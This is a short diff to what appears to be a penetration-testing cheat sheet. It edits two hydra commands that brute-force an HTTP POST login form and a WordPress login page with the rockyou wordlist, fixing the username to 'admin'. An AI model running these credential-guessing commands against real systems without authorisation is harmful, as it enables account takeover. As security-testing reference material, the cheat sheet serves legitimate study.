@@ -39,12 +39,12 @@ SMB, SMTP, MySQL, etc...
 
 ### Bruteforce HTTP Post form :
 
-`hydra -l username -P rockyou.txt 192.168.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Your password is incorrect"`
+`hydra -l admin -P rockyou.txt 192.168.10.10 http-post-form "/login:username=admin&password=^PASS^:F=Your password is incorrect"`
 
 
 ### Bruteforce Wordpress :
 
-`hydra -l username -P rockyou.txt 192.168.10.10 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
+`hydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post '/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
 
 
 
